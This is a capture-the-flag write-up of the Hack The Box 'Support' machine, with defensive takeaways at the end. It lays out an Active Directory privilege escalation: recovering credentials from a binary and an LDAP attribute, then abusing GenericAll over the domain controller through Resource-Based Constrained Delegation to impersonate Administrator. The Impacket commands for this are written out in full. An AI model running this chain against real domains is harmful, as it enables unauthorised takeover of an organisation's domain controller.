# Hack The Box — Support

## Overview

**Support** is a Windows Active Directory machine where the attack path moves from service enumeration and credential recovery to LDAP enumeration, WinRM access, ACL analysis with BloodHound, and finally privilege escalation through Resource-Based Constrained Delegation (RBCD).

The important part of this machine was understanding how several AD concepts connect:

`LDAP credential → support user → GenericAll over DC$ → RBCD → Kerberos S4U → Administrator service ticket`

---

## Initial Enumeration

An Nmap scan identified the target as a Windows Domain Controller for `support.htb`.

Important services included:

- 53 — DNS
- 88 — Kerberos
- 389 / 3268 — LDAP
- 445 — SMB
- 5985 — WinRM

Port 5985 indicated that WinRM was available over HTTP.

---

## Credential Discovery

During enumeration, the `UserInfo.exe` application was decompiled and its password-protection logic inspected.

The application contained an encrypted LDAP credential and the key used by its protection routine. Recovering the credential allowed authenticated LDAP queries against the domain.

LDAP enumeration of the `support` account revealed an interesting `info` attribute containing another credential.

Using this credential, WinRM access was obtained as:

```text
SUPPORT\support
```

---

## Active Directory Enumeration

Once connected through Evil-WinRM, I enumerated the current account and its group memberships.

The `support` user belonged to:

```text
Shared Support Accounts
Remote Management Users
Domain Users
```

The `Remote Management Users` membership explained why the account could connect through WinRM.

The more interesting group was:

```text
Shared Support Accounts
```

To understand its effective permissions, I collected Active Directory data with SharpHound and imported the resulting ZIP into BloodHound.

---

## BloodHound Analysis

BloodHound revealed the following relationship:

```text
SUPPORT@SUPPORT.HTB
        |
        | MemberOf
        v
SHARED SUPPORT ACCOUNTS
        |
        | GenericAll
        v
DC.SUPPORT.HTB
```

This was the privilege-escalation path.

`GenericAll` over the DC computer object gives the group extensive control over that object. One way to abuse this is **Resource-Based Constrained Delegation (RBCD)**.

Because `support` is a member of `Shared Support Accounts`, the user inherits this capability.

---

## Checking MachineAccountQuota

Before using RBCD, I checked whether a normal domain user was allowed to create computer accounts:

```powershell
Get-ADObject "DC=support,DC=htb" -Properties ms-ds-machineaccountquota |
    Select-Object ms-ds-machineaccountquota
```

Result:

```text
ms-ds-machineaccountquota
-------------------------
10
```

The domain therefore allowed the account to create a machine account.

---

## Creating an Attacker-Controlled Computer

Using Impacket, I created a computer account whose password I controlled:

```bash
impacket-addcomputer \
'support.htb/support:<REDACTED>' \
-computer-name 'JHATTACK$' \
-computer-pass '<REDACTED>' \
-dc-ip <TARGET_IP>
```

This created:

```text
JHATTACK$
```

The important distinction is that this computer account is controlled by the attacker and can authenticate to Kerberos like another domain principal.

---

## Configuring RBCD

Next, I used the `GenericAll` permission over `DC$` to modify:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

on the DC computer object.

```bash
impacket-rbcd \
-action write \
-delegate-from 'JHATTACK$' \
-delegate-to 'DC$' \
-dc-ip <TARGET_IP> \
'support.htb/support:<REDACTED>'
```

Successful output included:

```text
Delegation rights modified successfully!
JHATTACK$ can now impersonate users on DC$ via S4U2Proxy
```

Conceptually:

```text
JHATTACK$
    |
    | permitted through RBCD
    v
DC$
```

The DC now trusted the attacker-controlled machine account for resource-based delegation.

---

## Kerberos S4U Impersonation

With RBCD configured, I requested a service ticket while impersonating `Administrator`:

```bash
impacket-getST \
-spn 'cifs/dc.support.htb' \
-impersonate Administrator \
-dc-ip <TARGET_IP> \
'support.htb/JHATTACK$:<REDACTED>'
```

Impacket performed:

```text
TGT for JHATTACK$
        ↓
S4U2Self
        ↓
impersonate Administrator
        ↓
S4U2Proxy
        ↓
Administrator ticket for CIFS/DC
```

The result was saved directly as a Kerberos credential cache:

```text
Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

This is important: **Administrator's password was never recovered.**

Instead, the attack resulted in a Kerberos service ticket authorizing access to the CIFS service as Administrator.

---

## Using the Kerberos Ticket

The cache was selected using:

```bash
export KRB5CCNAME="$PWD/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache"
```

I verified it with:

```bash
klist
```

which showed:

```text
Default principal: Administrator@support.htb

Service principal:
cifs/dc.support.htb@SUPPORT.HTB
```

The `KRB5CCNAME` environment variable tells Kerberos-aware applications which credential cache to use.

---

## DNS Troubleshooting

Initially, Kerberos SMB authentication failed with:

```text
Name or service not known
```

The ticket itself was valid. Kali simply could not resolve:

```text
dc.support.htb
```

This mattered because the Kerberos ticket was issued specifically for:

```text
cifs/dc.support.htb
```

Adding the host mapping resolved the problem:

```bash
echo '<TARGET_IP> dc.support.htb support.htb' | sudo tee -a /etc/hosts
```

This was a useful reminder that Kerberos is heavily dependent on correct hostnames and service principal names.

---

## Administrator SMB Access

The CIFS ticket could then be used without supplying an Administrator password:

```bash
impacket-smbclient -k -no-pass dc.support.htb
```

Listing the shares showed:

```text
ADMIN$
C$
IPC$
NETLOGON
support-tools
SYSVOL
```

Access to the administrative `C$` share confirmed the privilege escalation:

```text
# use C$
# cd Users
# cd Administrator
# cd Desktop
```

At this point, Administrator-level file access had been achieved.

---

## Rubeus vs Impacket Ticket Formats

The HTB material also discusses performing the attack with Rubeus.

Rubeus typically produces a Windows Kerberos ticket in `.kirbi` format. When moving that ticket to Linux for use with Impacket, it can be converted using:

```text
ticketConverter.py
```

The resulting `.ccache` can then be selected with:

```bash
export KRB5CCNAME=/path/to/ticket.ccache
```

In my attack path this conversion was unnecessary because `impacket-getST` generated the `.ccache` directly.

```text
Rubeus route:
.kirbi → ticketConverter.py → .ccache → KRB5CCNAME

My route:
impacket-getST → .ccache → KRB5CCNAME
```

---

## Attack Chain

```text
Service Enumeration
        ↓
UserInfo.exe Analysis
        ↓
LDAP Credentials
        ↓
LDAP Enumeration
        ↓
support Credentials
        ↓
WinRM as support
        ↓
SharpHound / BloodHound
        ↓
support
  MemberOf
        ↓
Shared Support Accounts
  GenericAll
        ↓
DC$
        ↓
Create JHATTACK$
        ↓
Configure RBCD
        ↓
S4U2Self + S4U2Proxy
        ↓
Administrator CIFS Ticket
        ↓
KRB5CCNAME
        ↓
Administrative C$ Access
```

## Key Takeaways

This machine demonstrated why Active Directory ACLs can be as important as direct administrator-group membership. The `support` user was not an administrator, but membership in a group with `GenericAll` over the domain controller computer object provided a path to complete compromise.

It also clarified the relationship between **RBCD**, **S4U2Self**, **S4U2Proxy**, service-specific Kerberos tickets, `.kirbi`/`.ccache` formats, and `KRB5CCNAME`.

From a defensive perspective, the chain highlights the importance of monitoring modifications to sensitive AD attributes such as `msDS-AllowedToActOnBehalfOfOtherIdentity`, unexpected computer-account creation, and unusual Kerberos delegation activity.
